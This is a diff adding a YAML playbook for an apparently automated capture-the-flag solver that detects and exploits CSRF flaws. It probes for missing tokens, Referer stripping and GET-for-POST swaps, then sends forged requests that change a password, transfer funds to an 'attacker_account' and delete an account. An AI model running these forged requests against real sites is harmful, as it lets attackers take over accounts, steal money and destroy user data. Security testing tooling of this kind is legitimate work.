@@ -1,0 +1,148 @@
+id: web_csrf
+name: Cross-Site Request Forgery (CSRF)
+category: web
+version: "1.0"
+author: system
+description: >
+  Detects Cross-Site Request Forgery (CSRF) vulnerabilities, allowing an attacker to trick
+  authenticated users into performing unintended actions on a web application.
+
+applies_when:
+  - "context.challenge.type == 'web'"
+
+min_confidence: 0.10
+stop_on_flag: true
+
+confidence_seeds:
+  - if: "any(p in context.found_paths for p in ['/change_password', '/transfer_funds', '/delete_account', '/update_profile', '/post_comment'])"
+    boost: 0.20
+    label: "State-changing action path found"
+  - if: "any(m == 'POST' for m in context.http_methods) and not any(p in context.params for p in ['csrf_token', '_csrf', 'authenticity_token'])"
+    boost: 0.15
+    label: "POST request without apparent CSRF token"
+
+detection_paths:
+  - id: csrf_token_absence_probe
+    name: CSRF token absence probe
+    description: >
+      Submits a POST request to a state-changing endpoint without a CSRF token and checks for success.
+    min_confidence: 0.10
+    steps:
+      - id: submit_without_token
+        action: http_probe
+        params:
+          method: POST
+          path: '/change_password' # Example path, ideally from context.found_paths
+          body: 'new_password=password123' # Example body
+          # Headers and cookies will be automatically handled by the framework
+        signals:
+          - match: '(?i)password updated|success|changed' # Keywords indicating successful action
+            on_match:
+              confidence_boost: 0.40
+              emit: csrf_vulnerable_no_token
+          - match: '200' # If the status code is 200 and no explicit error about token
+            in: status_code
+            on_match:
+              confidence_boost: 0.25
+              emit: csrf_potential_no_token
+
+  - id: csrf_referer_bypass_probe
+    name: CSRF Referer header bypass probe
+    description: >
+      Attempts to bypass Referer header validation by stripping or manipulating it.
+    min_confidence: 0.20
+    steps:
+      - id: strip_referer
+        action: http_probe
+        params:
+          method: POST
+          path: '/transfer_funds' # Example path
+          body: 'amount=100&to_account=123' # Example body
+          headers:
+            Referer: '' # Strip Referer header
+        signals:
+          - match: '(?i)funds transferred|success'
+            on_match:
+              confidence_boost: 0.35
+              emit: csrf_vulnerable_referer_bypass
+          - match: '200'
+            in: status_code
+            on_match:
+              confidence_boost: 0.20
+              emit: csrf_potential_referer_bypass
+
+  - id: csrf_method_swap_probe
+    name: CSRF method swap probe (GET for POST)
+    description: >
+      Tries to perform a state-changing action typically done via POST using a GET request.
+    min_confidence: 0.15
+    steps:
+      - id: get_for_post
+        action: http_probe
+        params:
+          method: GET
+          path: '/delete_account?confirm=true' # Example path and query params
+        signals:
+          - match: '(?i)account deleted|success'
+            on_match:
+              confidence_boost: 0.30
+              emit: csrf_vulnerable_method_swap
+          - match: '200'
+            in: status_code
+            on_match:
+              confidence_boost: 0.15
+              emit: csrf_potential_method_swap
+
+exploitation_paths:
+  - id: execute_forged_action_no_token
+    name: Execute forged action (no token)
+    requires_signal: csrf_vulnerable_no_token
+    technique: csrf_no_token
+    description: >
+      Successfully forged a request by omitting the CSRF token.
+      This path could be used to perform any state-changing action.
+    steps:
+      - id: confirm_forged_action
+        action: http_probe
+        params:
+          method: POST
+          path: '/change_password' # Re-submit with a new arbitrary payload
+          body: 'new_password=hackedpassword'
+        capture:
+          - pattern: '(?i)password updated to hackedpassword|flag\{[^}]+\}|CTF\{[^}]+\}'
+            as: forged_action_result
+
+  - id: execute_forged_action_referer_bypass
+    name: Execute forged action (Referer bypass)
+    requires_signal: csrf_vulnerable_referer_bypass
+    technique: csrf_referer_bypass
+    description: >
+      Successfully forged a request by bypassing Referer header validation.
+    steps:
+      - id: confirm_forged_action_referer
+        action: http_probe
+        params:
+          method: POST
+          path: '/transfer_funds'
+          body: 'amount=99999&to_account=attacker_account'
+          headers:
+            Referer: ''
+        capture:
+          - pattern: '(?i)transfer of 99999 to attacker_account confirmed|flag\{[^}]+\}|CTF\{[^}]+\}'
+            as: forged_action_result
+
+  - id: execute_forged_action_method_swap
+    name: Execute forged action (method swap)
+    requires_signal: csrf_vulnerable_method_swap
+    technique: csrf_method_swap
+    description: >
+      Successfully forged a request by using a GET method for an action typically requiring POST.
+    steps:
+      - id: confirm_forged_action_method
+        action: http_probe
+        params:
+          method: GET
+          path: '/delete_account?confirm=true'
+        capture:
+          - pattern: '(?i)account successfully deleted|flag\{[^}]+\}|CTF\{[^}]+\}'
+            as: forged_action_result
